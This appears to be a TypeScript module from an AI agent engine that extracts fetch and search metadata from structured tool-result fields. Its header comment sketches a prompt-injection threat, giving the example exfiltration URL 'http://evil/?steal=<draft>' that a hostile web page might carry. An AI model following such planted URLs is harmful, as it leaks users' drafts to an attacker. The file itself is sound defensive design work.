// @rhema/engine/mapper — tolerant, DELIBERATELY NARROW extractors for tool-result content.
//
// REQ-ARCH-15 is the point of this file: a `source.read` URL comes from the tool RESULT, never the model's
// request — and it is read only from an EXPLICIT structured field the run-task fetcher/proxy stamps onto the
// normalized result (`url`/`resolved_url`). We never scan free text for a URL: a hostile fetched page could
// carry `http://evil/?steal=<draft>` in its body, and pattern-matching a URL out of page text would launder
// exactly the exfil channel §12.8 exists to close. If the structured field is absent, we emit no `source.read`.

/** The web-fetch fields the mapper trusts — only these, only when the harness stamped them structurally. */
export interface FetchResult {
  url?: string;
  title?: string;
  status?: number;
  bytes?: number;
}

function firstObject(content: unknown): Record<string, unknown> | undefined {
  if (content && typeof content === "object" && !Array.isArray(content)) {
    return content as Record<string, unknown>;
  }
  if (Array.isArray(content)) {
    for (const b of content) {
      if (b && typeof b === "object") {
        const o = b as Record<string, unknown>;
        // a normalized web_fetch result block, or a nested {result}/{content} envelope
        if ("url" in o || "resolved_url" in o || "status" in o) return o;
        const nested = firstObject(o.result ?? o.content);
        if (nested) return nested;
      }
    }
  }
  return undefined;
}

/** Read the fetch fields from a normalized tool-result envelope. Structured fields only (REQ-ARCH-15). */
export function extractFetchResult(content: unknown): FetchResult {
  const o = firstObject(content);
  if (!o) return {};
  const url = typeof o.url === "string" ? o.url : typeof o.resolved_url === "string" ? o.resolved_url : undefined;
  const title = typeof o.title === "string" ? o.title : undefined;
  const status = typeof o.status === "number" ? o.status : undefined;
  const bytes =
    typeof o.bytes === "number" ? o.bytes : typeof o.byte_count === "number" ? o.byte_count : undefined;
  return { ...(url ? { url } : {}), ...(title ? { title } : {}), ...(status !== undefined ? { status } : {}), ...(bytes !== undefined ? { bytes } : {}) };
}

/**
 * Read a web-search result count from a normalized result envelope (structured field only).
 * Returns `null` when the envelope carries no count — "not observed" is honest; fabricating `0`
 * would report an empty result set that never happened (RES.3).
 */
export function extractSearchResultCount(content: unknown): number | null {
  const o = firstObject(content);
  const n = o?.result_count ?? o?.resultCount ?? (Array.isArray(o?.results) ? o!.results.length : undefined);
  return typeof n === "number" ? n : null;
}

/** The registrable-ish host of a URL, for a bounded domain label. Returns undefined on a malformed URL. */
export function hostOf(url: string): string | undefined {
  try {
    return new URL(url).host || undefined;
  } catch {
    return undefined;
  }
}

/**
 * True for a well-formed absolute http(s) URL. The `source.read` event's `url` is validated against `z.url()`
 * at build time and THROWS on a bad value; a page-influenced redirect landing on a relative/garbage string
 * would otherwise kill the whole phase's event stream. We gate on this first and skip `source.read` when it
 * fails (the fetch still shows as an internal `tool.audit`) rather than crash the mapper.
 */
export function isAbsoluteHttpUrl(url: string): boolean {
  try {
    const u = new URL(url);
    return u.protocol === "http:" || u.protocol === "https:";
  } catch {
    return false;
  }
}
